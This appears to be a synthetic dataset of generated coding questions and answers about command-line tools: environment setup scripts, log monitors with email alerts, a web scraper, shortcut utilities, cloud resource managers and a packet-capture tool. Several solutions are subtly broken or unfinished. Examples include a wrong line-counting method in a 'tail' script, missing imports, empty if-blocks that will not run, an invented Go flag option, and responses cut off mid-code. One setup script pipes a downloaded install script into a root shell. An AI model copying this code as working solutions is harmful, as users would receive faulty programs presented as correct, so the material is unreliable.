Package Management\n\n```bash\n#!/bin/bash\n\n# Check if Node.js is installed\nif ! command -v node &> /dev/null\nthen\n    echo \"Node.js not found. Installing...\"\n    curl -sL https://deb.nodesource.com/setup_16.x | sudo -E bash -\n    sudo apt-get install -y nodejs\nfi\n\n# Check if npm is installed\nif ! command -v npm &> /dev/null\nthen\n    echo \"npm not found. Installing...\"\n    sudo apt-get install npm\nfi\n\n# Create a new npm project\nread -p \"Enter your project name: \" project_name\nmkdir -p \"$project_name\"\ncd \"$project_name\" || exit\nnpm init -y\n\n# Install dependencies\nread -p \"Enter the required packages separated by comma: \" packages\npackages_array=($(echo $packages | tr \",\" \" \"))\n\nfor package in \"${packages_array[@]}\"\ndo\n    npm install --save $package\ndone\n\n# Update package.json with dependencies\njq '.dependencies|=.' package.json > package.json.new && mv package.json.new package.json\n\necho \"Successfully set up environment for $project_name with packages: $packages\"\n\ncd - || exit\n```\n\nThese scripts create a medium complexity CLI tool for setting up development environments with virtualenv and Node.js, respectively. They prompt the user for input, install necessary tools, create a virtual environment, and manage project dependencies."}, {"L2_TASK": "CLI", "L3_TASK": "Software development environment config", "Complexity_Level": "extremely difficult", "Response": "Question 1: Develop a command-line interface (CLI) tool that configures a developer's environment by setting up a custom-built virtual environment, installing specified dependencies, and configuring Git repositories with a given remote URL. The tool should also automatically generate a `.gitignore` file based on the project's requirements.\n\n**Concept**: Software Development, CLI, Virtual Environments, Dependency Management, Git\n\n**Solution**:\n```python\nimport os\nimport subprocess\nfrom configparser import ConfigParser\n\ndef create_virtualenv(venv_path, python_version):\n    subprocess.run(['python', f'{python_version}', '-m', 'venv', venv_path], check=True)\n\ndef install_dependencies(venv_path, requirements_file):\n    subprocess.run([os.path.join(venv_path, 'bin', 'pip'), 'install', '-r', requirements_file], check=True)\n\ndef configure_git(repo_path, remote_url):\n    subprocess.run(['git', 'init', repo_path], check=True)\n    subprocess.run(['git', 'config', 'user.name', 'Your Name'], check=True)\n    subprocess.run(['git', 'config', 'user.email', 'you\n```"}, {"L2_TASK": "CLI", "L3_TASK": "Automated script generation", "Complexity_Level": "medium", "Response": "Question 1:\nProblem: A software engineer needs to automate the process of generating a report from multiple CSV files in a directory. The script should concatenate the CSV files and filter out rows where a specific column value is below a given threshold.\n\nConcept: CLI, Automated script generation\n\nSolution:\n```python\nimport os\nimport csv\nimport sys\n\ndef concatenate_csvs(directory, column_index, threshold):\n    output_rows = []\n    \n    for filename in os.listdir(directory):\n        if filename.endswith(\".csv\"):\n            with open(os.path.join(directory, filename), \"r\") as csvfile:\n                reader = csv.reader(csvfile)\n                header = next(reader)\n                \n                if column_index >= len(header):\n                    print(f\"Error: Invalid column index. Expected index between 0 and {len(header) - 1}.\")\n                    return\n                \n                for row in reader:\n                    if float(row[column_index]) >= threshold:\n                        output_rows.append(row)\n    \n    output_filename = \"filtered_report.csv\"\n    with open(output_filename, \"w\", newline=\"\") as outfile:\n        writer = csv.writer(outfile)\n        writer.writerow(header)\n        writer.writerows(output_rows)\n    \n    print(f\"Report generated: {output_filename}\")\n\n# Example usage: python script.py path/to/csvs 2 1000\ndirectory = sys.argv[1]\ncolumn_index = int(sys.argv[2]) - 1  # Adjust for 0-based indexing\nthreshold = float(sys.argv[3])\nconcatenate_csvs(directory, column_index, threshold)\n```\nExplanation: This script reads all CSV files in the provided directory, filters out rows based on a specified column index and a threshold value, and concatenates the remaining rows into a new CSV file called \"filtered_report.csv\". The script is designed to be run from the command line and accepts three arguments: the directory path, the column index (1-based), and the threshold value.\n\nQuestion 2:\nProblem: A system administrator needs to create a CLI tool that monitors a log file for specific error patterns and sends email notifications when an error occurs. The tool should be able to run continuously and only send one email per unique error pattern.\n\nConcept: CLI, Automated script generation\n\nSolution:\n```python\nimport re\nimport smtplib\nfrom email.mime.text import MIMEText\nfrom email.mime.multipart import MIMEMultipart\nimport time\nimport argparse\n\ndef monitor_log(file_path, error_patterns, email_config):\n    last_errors = set()\n    while True:\n        with open(file_path, \"r\") as log_file:\n            for line in log_file:\n                for pattern in error_patterns:\n                    if re.search(pattern, line, re.IGNORECASE):\n                        error = line.strip()\n                        if error not in last_errors:\n                            last_errors.add(error)\n                            send_email(error, email_config)\n                            print(f\"Error detected: {error}\")\n                            time.sleep(5)  # Avoid flooding the email server\n\ndef send_email(error, config):\n    msg = MIMEMultipart()\n    msg['From'] = config['from']\n    msg['To'] = config['to']\n    msg['Subject'] = f\"Log Error Alert: {error}\"\n\n    body = f\"New error detected in log file:\\n{error}\"\n    msg.attach(MIMEText(body, 'plain'))\n\n    server = smtplib.SMTP(config['smtp_server'], config['smtp_port'])\n    server.starttls()\n    server.login(config['username'], config['password'])\n    text = msg.as_string()\n    server.sendmail(config['from'], config['to'], text)\n    server.quit()\n\nif __name__ == \"__main__\":\n    parser = argparse.ArgumentParser(description=\"Log file error monitor\")\n    parser.add_argument(\"file\", help=\"Path to the log file\")\n    parser.add_argument(\"-p\", \"--patterns\", nargs=\"+\", help=\"Error patterns to search\")\n    parser.add_argument(\"-e\", \"--email\", help=\"Email configuration in JSON format\")\n    args = parser.parse_args()\n\n    error_patterns = [re.compile(p) for p in args.patterns]\n    email_config = json.loads(args.email)\n\n    monitor_log(args.file, error_patterns, email_config)\n```\nExplanation: This script monitors a log file for specified error patterns and sends email notifications when a new unique error is detected. It runs continuously and uses command line arguments for the log file path, error patterns, and email configuration. The email configuration should be in JSON format, e.g., `{\"from\": \"admin@example.com\", \"to\": \"sysadmin@example.com\", \"smtp_server\": \"smtp.example.com\", \"smtp_port\": 587, \"username\": \"your_username\", \"password\": \"your_password\"}`.\n\nTo run the script, you would use a command like this:\n```sh\npython monitor.py /path/to/log.log -p \"pattern1\" \"pattern2\" -e '{\"from\": \"admin@example.com\", \"to\": \"sysadmin@example.com\", ...}'\n```"}, {"L2_TASK": "CLI", "L3_TASK": "Automated script generation", "Complexity_Level": "extremely difficult", "Response": "Question 1: Developing a CLI script that automatically scrapes data from a dynamic, JavaScript-rendered website, handles AJAX requests, and stores the data in a structured format.\n\nProblem: You need to create an automated script that retrieves the latest stock prices from a financial news website that uses JavaScript to load the data dynamically. The script should handle AJAX requests and store the collected data in a SQLite database.\n\nSolution:\n```python\nimport requests\nfrom bs4 import BeautifulSoup\nimport json\nfrom fake_useragent import UserAgent\nimport sqlite3\n\n# Configure the user agent to mimic a web browser\nua = UserAgent()\n\n# Function to extract data from the AJAX response\ndef extract_data(response):\n    data = json.loads(response.text)\n    prices = data['stock_prices']\n    return prices\n\n# Fetch the initial page to get the AJAX request URL\nurl = \"https://example.com/stocks\"\nheaders = {'User-Agent': ua.random}\nresponse = requests.get(url, headers=headers)\nsoup = BeautifulSoup(response.text, 'html.parser')\najax_url = soup.find('script', id='stock-data').get('src')\n\n# Send a request to the AJAX URL to fetch the stock prices\najax_response = requests.get(ajax_url, headers=headers)\nprices = extract_data(ajax_response)\n\n# Connect to the SQLite database\nconn = sqlite3.connect('stock_prices.db')\nc = conn.cursor()\n\n# Create the table if it doesn't exist\nc.execute('''CREATE TABLE IF NOT EXISTS stock_prices\n             (symbol text, price real)''')\n\n# Insert the data into the database\nfor price_data in prices:\n    symbol, price = price_data['symbol'], price_data['price']\n    c.execute(\"INSERT INTO stock_prices VALUES (?, ?)\", (symbol, price))\n\n# Commit the changes and close the connection\nconn.commit()\nconn.close()\n```\nConcept: Automated script generation\n\nQuestion 2: Creating a CLI script to monitor system logs, perform real-time analysis, and send alerts based on custom patterns and thresholds.\n\nProblem: Build a script that reads system logs (e.g., from `/var/log/syslog`), performs complex pattern matching and anomaly detection, and sends email notifications when certain events exceed predefined thresholds.\n\nSolution:\n```python\nimport re\nimport sys\nimport time\nimport smtplib\nfrom email.mime.text import MIMEText\nfrom email.mime.multipart import MIMEMultipart\nimport signal\n\n# Custom log monitoring function\ndef monitor_logs(log_file, patterns, thresholds, email_recipients):\n    log_fh = open(log_file, 'r')\n    prev_lines = []\n    \n    while True:\n        curr_lines = log_fh.readlines()\n        diff_lines = [line for line in curr_lines if line not in prev_lines]\n        \n        for line in diff_lines:\n            for pattern, threshold in thresholds.items():\n                match = re.search(pattern, line)\n                if match:\n                    count = match.groupdict()['count']\n                    if int(count) > threshold:\n                        send_alert_email(email_recipients, pattern, count)\n                    \n        prev_lines.extend(diff_lines)\n        time.sleep(5)  # Adjust the polling interval as needed\n\n# Function to send email alerts\ndef send_alert_email(recipients, pattern, count):\n    msg = MIMEMultipart()\n    msg['From'] = 'your_email@example.com'\n    msg['To'] = ', '.join(recipients)\n    msg['Subject'] = f'Alert: Pattern \"{pattern}\" exceeded threshold ({count})'\n    \n    body = f'Pattern \"{pattern}\" has been detected {count} times, exceeding the threshold.'\n    msg.attach(MIMEText(body, 'plain'))\n    \n    server = smtplib.SMTP('smtp.example.com', 587)\n    server.starttls()\n    server.login('your_email@example.com', 'your_password')\n    text = msg.as_string()\n    server.sendmail(msg['From'], recipients, text)\n    server.quit()\n\nif __name__ == '__main__':\n    log_file = '/var/log/syslog'\n    patterns = {\n        r'Error\\s+\\((?P<count>\\d+)\\)': 10,\n        r'Critical\\s+\\((?P<count>\\d+)\\)': 5\n    }\n    email_recipients = ['admin@example.com']\n    thresholds = patterns\n\n    signal.signal(signal.SIGINT, lambda sig, frame: sys.exit(0))  # Graceful exit on Ctrl+C\n\n    monitor_logs(log_file, patterns, thresholds, email_recipients)\n```\nConcept: Automated script generation"}, {"L2_TASK": "CLI", "L3_TASK": "Environment setup automation", "Complexity_Level": "medium", "Response": "Question 1:\nProblem: You are a developer working on a project that requires multiple dependencies to be installed on different systems. You need to automate the setup process for a command-line interface (CLI) using a shell script. The script should install the required packages, set environment variables, and create symbolic links to the necessary executables.\n\nConcept: Shell Scripting\n\nSolution:\n```bash\n#!/bin/bash\n\n# Linux Package Manager Setup\nif [[ -f \"/etc/os-release\" ]]; then\n    source /etc/os-release\n    case $ID in\n        ubuntu|debian)\n            sudo apt update\n            sudo apt install -y python3 python3-pip git\n            ;;\n        rhel|centos|fedora)\n            sudo yum install -y epel-release\n            sudo yum install -y python3 python3-pip git\n            ;;\n        *)\n            echo \"Unsupported Linux distribution.\"\n            exit 1\n            ;;\n    esac\nelse\n    echo \"This script only supports Linux systems with apt or yum package managers.\"\n    exit 1\nfi\n\n# Install project dependencies\npip3 install --user -r requirements.txt\n\n# Set environment variables\necho \"export PROJECT_HOME=$(pwd)\" >> ~/.bashrc\necho \"export PATH=\\$PATH:~/.local/bin\" >> ~/.bashrc\nsource ~/.bashrc\n\n# Create symbolic links\nln -s \"$(pwd)/scripts/cli.py\" ~/.local/bin/cli\n\necho \"Environment setup completed. Run 'cli --help' for usage.\"\n```\nExplanation: This shell script detects the Linux distribution and installs the required packages using the appropriate package manager (apt for Ubuntu/Debian, yum for RHEL/CentOS/Fedora). It then installs project dependencies using pip, sets environment variables by updating the `~/.bashrc` file, and creates a symbolic link for the CLI script in the user's `PATH`.\n\nQuestion 2:\nProblem: You have a CLI tool that requires different configurations for development and production environments. You need to create a bash script that sets up the environment accordingly based on user input, manages environment-specific variables, and sources them correctly.\n\nConcept: Shell Scripting\n\nSolution:\n```bash\n#!/bin/bash\n\n# Prompt user for environment selection\necho \"Select an environment (1. Development 2. Production):\"\nread env\n\ncase $env in\n    1)\n        echo \"Setting up development environment...\"\n        cp env_dev.sh .env\n        ;;\n    2)\n        echo \"Setting up production environment...\"\n        cp env_prod.sh .env\n        ;;\n    *)\n        echo \"Invalid choice. Exiting.\"\n        exit 1\n        ;;\nesac\n\n# Source the environment file and check variables\nsource .env\n\necho \"Checking environment variables...\"\necho \"API_KEY: $API_KEY\"\necho \"DB_URL: $DB_URL\"\n\n# Export variables for current session\nexport API_KEY\nexport DB_URL\n\n# Perform additional setup tasks\n# ...\n\necho \"Environment setup completed.\"\n```\nExplanation: This script prompts the user to select the desired environment (development or production) and copies the corresponding environment configuration file (`env_dev.sh` or `env_prod.sh`) to `.env`. It then sources the `.env` file to make the variables available within the script and exports them for the current shell session. This allows the CLI tool to access the correct environment variables based on the user's selection."}, {"L2_TASK": "CLI", "L3_TASK": "Environment setup automation", "Complexity_Level": "extremely difficult", "Response": "Question 1: Develop a fully customizable command-line interface (CLI) tool that automatically sets up a development environment for a given project. The tool should detect project dependencies, install them, configure environment variables, and create necessary symbolic links. It should support various programming languages and package managers.\n\n**Concept**: Command-Line Interface, Environment setup automation\n\n**Solution**:\nTo achieve this, we can create a Python script that uses `argparse` for CLI arguments, `os` for file system operations, `subprocess` for executing commands, and `json` for reading project configuration. Here's an example implementation:\n\n```python\nimport argparse\nimport json\nimport os\nimport subprocess\n\ndef read_project_config(project_dir):\n    config_file = os.path.join(project_dir, 'project_config.json')\n    with open(config_file, 'r') as f:\n        return json.load(f)\n\ndef install_dependencies(package_manager, dependencies):\n    subprocess.run([package_manager, 'install'] + dependencies)\n\ndef configure_environment(project_dir, env_vars):\n    env_file = os.path.join(project_dir, '.env')\n    with open(env_file, 'w') as f:\n        for key, value in env_vars.items():\n            f.write(f\"{key}={value}\\n\")\n\ndef create_symbolic_links(project_dir, links):\n    for source, target in links.items():\n        source_path = os.path.join(project_dir, source)\n        target_path = os.path.join(project_dir, target)\n        os.symlink(source_path, target_path)\n\ndef main():\n    parser = argparse.ArgumentParser(description='Automate development environment setup.')\n    parser.add_argument('project_dir', type=str, help='Path to the project directory')\n    args = parser.parse_args()\n\n    project_config = read_project_config(args.project_dir)\n    package_manager = project_config['package_manager']\n    dependencies = project_config['dependencies']\n    env_vars = project_config['env_vars']\n    links = project_config['links']\n\n    install_dependencies(package_manager, dependencies)\n    configure_environment(args.project_dir, env_vars)\n    create_symbolic_links(args.project_dir, links)\n\nif __name__ == '__main__':\n    main()\n```\n\nExample `project_config.json`:\n```json\n{\n  \"package_manager\": \"npm\",\n  \"dependencies\": [\"react\", \"typescript\", \"webpack\"],\n  \"env_vars\": {\n    \"API_KEY\": \"your_api_key\",\n    \"DB_URL\": \"mongodb://localhost:27017/myapp\"\n  },\n  \"links\": {\n    \"src\": \"public/js/src\",\n    \"node_modules\": \"public/js/node_modules\"\n  }\n}\n```\n\nQuestion 2: Design a CLI tool that not only automates environment setup but also monitors and updates project dependencies, ensuring they're always up-to-date. The tool should provide notifications for outdated dependencies and allow for selective updates.\n\n**Concept**: Command-Line Interface, Environment setup automation, Dependency management\n\n**Solution**:\nWe can extend the previous solution to include dependency checking and updates. Here's a modified Python script with an additional `update_dependencies` function:\n\n```python\n# Import the same libraries as before\n\ndef check_updates(package_manager, dependencies):\n    # Pseudo-code: replace with actual package manager-specific dependency check\n    updates_available = {dep: latest_version for dep, latest_version in package_manager.check_updates(dependencies)}\n    return updates_available\n\ndef update_dependencies(package_manager, dependencies_to_update):\n    for dep in dependencies_to_update:\n        subprocess.run([package_manager, 'update', dep])\n\ndef main():\n    # ...\n    # Same as before until the end of the main function\n\n    updates = check_updates(package_manager, dependencies)\n    if updates:\n        print(\"Updates available:\")\n        for dep, latest_version in updates.items():\n            print(f\"{dep}: {dependencies[dep]} -> {latest_version}\")\n        update_choice = input(\"Do you want to update all outdated dependencies? (y/n) \")\n\n        if update_choice.lower() == 'y':\n            update_dependencies(package_manager, dependencies)\n        else:\n            print(\"Skipping updates.\")\n    else:\n        print(\"All dependencies are up-to-date.\")\n\n    # ...\n```\n\nThis solution involves extending the CLI tool to check for updates using a package manager's API and prompt the user for updating outdated dependencies. Note that the `check_updates` and `update_dependencies` functions would need to be implemented for each supported package manager (e.g., `npm`, `pip`, `gem`, etc.)"}, {"L2_TASK": "CLI", "L3_TASK": "CLI shortcuts", "Complexity_Level": "medium", "Response": "Question 1: Create a CLI tool that accepts a command-line argument for a file path and provides a shortcut to quickly print the last 10 lines of the file.\n\nConcept: CLI shortcuts\n\nSolution:\nIn this problem, we'll use Python to create a simple CLI tool called `tail` that mimics the functionality of the Unix `tail` command. We'll utilize the `argparse` library to handle command-line arguments.\n\n```python\nimport argparse\nimport sys\n\ndef tail(file_path, lines=10):\n    try:\n        with open(file_path, 'r') as file:\n            for line_num, line in enumerate(file, 1):\n                if line_num > (sys.getsizeof(file.readlines()) - lines):\n                    print(line, end='')\n    except FileNotFoundError:\n        print(f\"Error: {file_path} not found.\")\n    except Exception as e:\n        print(f\"An error occurred: {str(e)}\")\n\nif __name__ == '__main__':\n    parser = argparse.ArgumentParser(description='Display the last n lines of a file.')\n    parser.add_argument('file', type=str, help='The file path to read.')\n    parser.add_argument('-n', '--lines', type=int, default=10, help='Number of lines to display (default: 10).')\n\n    args = parser.parse_args()\n    tail(args.file, args.lines)\n```\n\nTo use the script, save it as `tail.py`, and run it from the command line:\n\n```sh\npython tail.py /path/to/your/file.txt -n 5\n```\n\nQuestion 2: Write a command-line utility that accepts a directory path as an argument and provides a shortcut to list all files in the directory, sorted by their last modification date, in reverse order.\n\nConcept: CLI shortcuts\n\nSolution:\nIn this problem, we'll use Python to create a CLI tool called `ls_sorted` that lists files in a directory sorted by their last modification date, in reverse order.\n\n```python\nimport argparse\nimport os\nfrom datetime import datetime\n\ndef list_files_sorted(directory):\n    try:\n        files = os.listdir(directory)\n        sorted_files = sorted(files, key=lambda x: os.path.getmtime(os.path.join(directory, x)), reverse=True)\n        \n        for file in sorted_files:\n            modified_time = datetime.fromtimestamp(os.path.getmtime(os.path.join(directory, file))).strftime('%Y-%m-%d %H:%M:%S')\n            print(f\"{file} - Last Modified: {modified_time}\")\n    except FileNotFoundError:\n        print(f\"Error: {directory} not found.\")\n    except Exception as e:\n        print(f\"An error occurred: {str(e)}\")\n\nif __name__ == '__main__':\n    parser = argparse.ArgumentParser(description='List files in a directory sorted by last modification date.')\n    parser.add_argument('dir', type=str, help='The directory path to list.')\n\n    args = parser.parse_args()\n    list_files_sorted(args.dir)\n```\n\nTo use the script, save it as `ls_sorted.py`, and run it from the command line:\n\n```sh\npython ls_sorted.py /path/to/your/directory\n```"}, {"L2_TASK": "CLI", "L3_TASK": "CLI shortcuts", "Complexity_Level": "extremely difficult", "Response": "Question 1: Design a command-line interface (CLI) utility that implements complex shell shortcuts for file management and automation. The utility should support the creation of custom aliases, interactive menus, and nested shortcut execution. Additionally, it should have a built-in scripting language for defining complex workflows.\n\nConcept: CLI Shortcuts\n\nSolution:\n```python\nimport os\nimport sys\nimport argparse\nimport builtins\nfrom contextlib import redirect_stdout\nfrom dataclasses import dataclass\nfrom io import StringIO\n\n@dataclass\nclass Shortcut:\n    command: str\n    aliases: list[str] = field(default_factory=list)\n    sub_shortcuts: dict[str, 'Shortcut'] = field(default_factory=dict)\n\n    def register(self, alias):\n        self.aliases.append(alias)\n\n    def execute(self, args):\n        if args.subShortcut:\n            subShortcut = self.sub_shortcuts.get(args.subShortcut)\n            if subShortcut:\n                subShortcut.execute(args)\n            else:\n                print(f\"Unknown subshortcut: {args.subShortcut}\")\n        else:\n            with redirect_stdout(sys.stderr):\n                builtins.exec(self.command)\n\ndef parse_args(subparsers):\n    parser = subparsers.add_parser('shortcut')\n    parser.add_argument('shortcut', choices=shortcuts.keys())\n    parser.add_argument('--subShortcut')\n\nshortcut_parser = argparse.ArgumentParser(add_help=False)\nsubparsers = shortcut_parser.add_subparsers()\nfor shortcut_name, shortcut in shortcuts.items():\n    shortcut_parser = subparsers.add_parser(shortcut_name, parents=[shortcut_parser])\n    shortcut_parser.set_defaults(shortcut=shortcut)\n\ndef main():\n    parser = argparse.ArgumentParser(description='CLI Shortcuts Utility')\n    parser.add_argument('-s', '--shortcut', action='store', dest='shortcut_aliases')\n    args = parser.parse_args()\n\n    if args.shortcut_aliases:\n        for alias in args.shortcut_aliases.split(','):\n            if alias in shortcuts:\n                shortcuts[alias].execute(args)\n            else:\n                print(f\"Unknown shortcut: {alias}\")\n    else:\n        parser.print_help()\n\nif __name__ == \"__main__\":\n    shortcuts = {\n        'ls': Shortcut('ls -lah', ['l', 'dir']),\n        'cdmp': Shortcut('cd ..', aliases=['u', 'up']),\n        'workflows': Shortcut('python workflows.py', sub_shortcuts={\n            'deploy': Shortcut('python deploy.py'),\n            'test': Shortcut('pytest')\n        })\n    }\n\n    # Example workflow script (workflows.py)\n    # Define a complex workflow like deploying and testing\n    workflow_script = \"\"\"\nif __name__ == \"__main__\":\n    print(\"Deploying resources...\")\n    # Deploy scripts here\n    print(\"Testing resources...\")\n    # Run test scripts here\n\"\"\"\n\n    # Register the workflow script as a shortcut\n    shortcuts['workflows'].sub_shortcuts['run'] = Shortcut(workflow_script)\n\n    main()\n```\nThis code creates a CLI tool with a set of predefined shortcuts like `ls`, `cdmp`, and `workflows`. Users can create custom aliases for shortcuts and use nested shortcuts for more complex tasks. The `workflows` shortcut demonstrates the use of a nested shortcut for executing a script with a complex workflow.\n\nQuestion 2: Implement a command-line interface (CLI) that predicts user intentions based on their history of commands and suggests relevant shortcuts. The system should learn from user interactions, adapt to their preferences, and provide a ranked list of suggestions.\n\nConcept: CLI Shortcuts\n\nSolution:\n```python\nimport os\nimport pickle\nfrom collections import defaultdict, Counter\nfrom heapq import nlargest\nfrom typing import List\n\nclass IntentPredictor:\n    def __init__(self, history_file='history.pkl'):\n        self.history_file = history_file\n        self.history = defaultdict(list)\n\n    def load_history(self):\n        try:\n            with open(self.history_file, 'rb') as f:\n                self.history = pickle.load(f)\n        except FileNotFoundError:\n            print(\"No history file found.\")\n\n    def save_history(self):\n        with open(self.\n```"}, {"L2_TASK": "CLI", "L3_TASK": "CLI for cloud management", "Complexity_Level": "medium", "Response": "Question 1: Develop a command-line interface (CLI) tool using Python for managing cloud resources on AWS. The tool should allow users to list all EC2 instances, create a new instance, and terminate an instance by its ID.\n\nConcept: \"CLI for cloud management\", \"AWS SDK for Python (Boto3)\"\n\nSolution 1:\n```python\nimport boto3\n\n# Function to list all EC2 instances\ndef list_instances():\n    ec2 = boto3.resource('ec2')\n    instances = ec2.instances.all()\n    for instance in instances:\n        print(f\"Instance ID: {instance.id}, State: {instance.state['Name']}, Type: {instance.instance_type}\")\n\n# Function to create a new EC2 instance\ndef create_instance(instance_type, key_name, security_group_id):\n    ec2 = boto3.client('ec2')\n    response = ec2.run_instances(\n        ImageId='ami-0c94855ba95c71c99',  # Use a suitable AMI ID\n        InstanceType=instance_type,\n        KeyName=key_name,\n        MinCount=1,\n        MaxCount=1,\n        SecurityGroupIds=[security_group_id]\n    )\n    print(f\"Created instance: {response['Instances'][0]['InstanceId']}\")\n\n# Function to terminate an EC2 instance by ID\ndef terminate_instance(instance_id):\n    ec2 = boto3.client('ec2')\n    response = ec2.terminate_instances(InstanceIds=[instance_id])\n    if response['TerminatingInstances']:\n        print(f\"Instance {instance_id} is terminating.\")\n    else:\n        print(\"Instance not found.\")\n\nif __name__ == \"__main__\":\n    operation = input(\"Choose an operation (list, create, terminate): \")\n    if operation == \"list\":\n        list_instances()\n    elif operation == \"create\":\n        instance_type = input(\"Enter the instance type (e.g., t2.micro): \")\n        key_name = input(\"Enter the key pair name: \")\n        security_group_id = input(\"Enter the security group ID: \")\n        create_instance(instance_type, key_name, security_group_id)\n    elif operation == \"terminate\":\n        instance_id = input(\"Enter the instance ID to terminate: \")\n        terminate_instance(instance_id)\n    else:\n        print(\"Invalid operation. Please choose 'list', 'create', or 'terminate'.\")\n```\nQuestion 2: Create a Bash script to manage Google Cloud Platform (GCP) resources. The script should list all GCP projects, create a new project, and delete a project by its ID.\n\nConcept: \"CLI for cloud management\", \"gcloud command-line tool\"\n\nSolution 2:\n```bash\n#!/bin/bash\n\n# Function to list all GCP projects\nlist_projects() {\n    gcloud projects list --format=\"value(projectId,name)\"\n}\n\n# Function to create a new GCP project\ncreate_project() {\n    project_id=$1\n    project_name=$2\n    gcloud projects create $project_id --name $project_name\n    echo \"Project created with ID: $project_id, Name: $project_name\"\n}\n\n# Function to delete a GCP project by ID\ndelete_project() {\n    project_id=$1\n    gcloud projects delete $project_id --quiet\n    echo \"Project $project_id deleted.\"\n}\n\n# Main script\nif [ \"$#\" -eq 0 ]; then\n    echo \"Usage: $0 [list|create <project_id> <project_name>|delete <project_id>]\"\n    exit 1\nfi\n\naction=$1\nshift\n\ncase $action in\n    list)\n        list_projects\n        ;;\n    create)\n        create_project $@\n        ;;\n    delete)\n        delete_project $@\n        ;;\n    *)\n        echo \"Invalid action. Use 'list', 'create', or 'delete'.\"\n        exit 1\n        ;;\nesac\n```\nSave the script as `gcloud_manager.sh`, give it execution permissions (`chmod +x gcloud_manager.sh`), and run it with the desired action along with the required parameters. For example, `./gcloud_manager.sh list` to list projects, `./gcloud_manager.sh create myproject my-project-name` to create a project, or `./gcloud_manager.sh delete myproject` to delete a project. Make sure you have the `gcloud` CLI tool installed and authenticated with a GCP account."}, {"L2_TASK": "CLI", "L3_TASK": "CLI for cloud management", "Complexity_Level": "extremely difficult", "Response": "Question 1: Develop a CLI tool in Python that manages multiple cloud providers (AWS, Azure, GCP) simultaneously, allowing users to create, update, and delete resources across all platforms with a unified command structure. The tool should support resource discovery, automatic configuration, and role-based access control.\n\n**Concept**: CLI, Cloud Computing, Infrastructure as a Service (IaaS)\n\n**Solution**:\n```python\nimport argparse\nimport boto3\nimport azure.mgmt.resource.resources as azure_resources\nimport google.auth\nfrom googleapiclient.discovery import build\n\ndef configure_cloud_providers():\n    # AWS configuration\n    aws_client = boto3.client('sts')\n    aws_role = 'MyAdminRole'\n    aws_credentials = aws_client.assume_role(RoleArn=f'arn:aws:iam::{AWS_ACCOUNT_ID}:role/{aws_role}', RoleSessionName='CLISession')\n\n    # Azure configuration\n    azure_credential = DefaultAzureCredential()\n    azure_client = azure_resources.SubscriptionClient(credential=azure_credential)\n\n    # GCP configuration\n    gcp_credentials, project_id = google.auth.default()\n    gcp_service = build('compute', 'v1', credentials=gcp_credentials)\n\n    return aws_client, azure_client, gcp_service\n\ndef create_resource(cloud_providers, resource_type, resource_name, region):\n    aws_client, azure_client, gcp_service = cloud_providers\n\n    # AWS resource creation\n    if resource_type == 'ec2':\n        # Code to create EC2 instance\n\n    # Azure resource creation\n    elif resource_type == 'vm':\n        # Code to create a virtual machine\n\n    # GCP resource creation\n    elif resource_type == 'instance':\n        # Code to create a Compute Engine instance\n\ndef delete_resource(cloud_providers, resource_type, resource_name, region):\n    aws_client, azure_client, gcp_service = cloud_providers\n\n    # AWS resource deletion\n    if resource_type == 'ec2':\n        # Code to delete EC2 instance\n\n    # Azure resource deletion\n    elif resource_type == 'vm':\n        # Code to delete a virtual machine\n\n    # GCP resource deletion\n    elif resource_type == 'instance':\n        # Code to delete a Compute Engine instance\n\n# CLI entry point\nif __name__ == \"__main__\":\n    parser = argparse.ArgumentParser()\n    parser.add_argument('-t', '--type', required=True, choices=['ec2', 'vm', 'instance'])\n    parser.add_argument('-n', '--name', required=True)\n    parser.add_argument('-r', '--region', required=True)\n    parser.add_argument('-a', '--action', required=True, choices=['create', 'delete'])\n    args = parser.parse_args()\n\n    cloud_providers = configure_cloud_providers()\n\n    if args.action == 'create':\n        create_resource(cloud_providers, args.type, args.name, args.region)\n    elif args.action == 'delete':\n        delete_resource(cloud_providers, args.type, args.name, args.region)\n```\nNote: This is a simplified example and doesn't include the full implementations for creating and deleting resources on each cloud platform. You would need to fill in those details according to the respective APIs and SDKs.\n\nQuestion 2: Create a CLI tool in Go that securely provisions, manages, and deprovisions Kubernetes clusters across multiple cloud providers (AWS EKS, Azure AKS, GCP GKE), using Terraform for infrastructure as code and Vault for secret management. The tool should perform rolling updates, scaling, and monitoring of the clusters.\n\n**Concept**: CLI, Cloud Computing, Infrastructure as a Service (IaaS), Container Orchestration, Terraform, Vault\n\n**Solution**:\n```go\npackage main\n\nimport (\n\t\"fmt\"\n\t\"os\"\n\n\t\"github.com/urfave/cli/v2\"\n\t\"github.com/hashicorp/terraform/command\"\n\t\"github.com/hashicorp/vault/api\"\n\t\"k8s.io/client-go/kubernetes\"\n\t\"k8s.io/client-go/tools/clientcmd\"\n)\n\nfunc main() {\n\tapp := &cli.App{\n\t\tName:  \"cloudkube\",\n\t\tUsage: \"Manage Kubernetes clusters on multiple cloud providers with Terraform and Vault\",\n\t\tCommands: []*cli.Command{\n\t\t\t{\n\t\t\t\tName:    \"provision\",\n\t\t\t\tAliases: []string{\"p\"},\n\t\t\t\tUsage:   \"Provision a Kubernetes cluster\",\n\t\t\t\tFlags: []cli.Flag{\n\t\t\t\t\t&cli.StringFlag{Name: \"provider\", Required: true, Choices: []string{\"aws\", \"azure\", \"gcp\"}},\n\t\t\t\t\t// Other flags for Terraform and Vault configuration\n\t\t\t\t},\n\t\t\t\tAction: func(c *cli.Context) error {\n\t\t\t\t\t// Code to provision a cluster using Terraform and Vault\n\t\t\t\t},\n\t\t\t},\n\t\t\t// Add other commands for management, deprovisioning, etc.\n\t\t},\n\t}\n\n\terr := app.Run(os.Args)\n\tif err != nil {\n\t\tfmt.Println(err)\n\t}\n}\n```\nNote: This is a high-level outline of a CLI tool, and the actual implementation would involve integrating with Terraform, Vault, and Kubernetes APIs for cluster management. The complexities include configuring and executing Terraform plans, interfacing with Vault for secret management, and working with Kubernetes client-go to manage clusters."}, {"L2_TASK": "CLI", "L3_TASK": "CLI tools for network troubleshooting", "Complexity_Level": "medium", "Response": "Question 1: Design a CLI tool in Python to capture and analyze network traffic data from a specified interface, displaying top 10 protocols by packet count.\n\n**Concept**: Network Programming\n\nSolution:\n```python\nimport os\nimport sys\nfrom collections import Counter\nfrom socket import inet_ntop, AF_INET, AF_INET6\nfrom scapy.all import sniff, IP, TCP, UDP\n\ndef get_packet_protocols(packet):\n    proto = packet[IP].proto\n    if proto == 6:\n        return 'TCP'\n    elif proto == 17:\n        return 'UDP'\n    else:\n        return 'Other'\n\ndef process_data(packet_protos, limit=10):\n    counter = Counter(packet_protos)\n    return counter.most_common(limit)\n\ndef 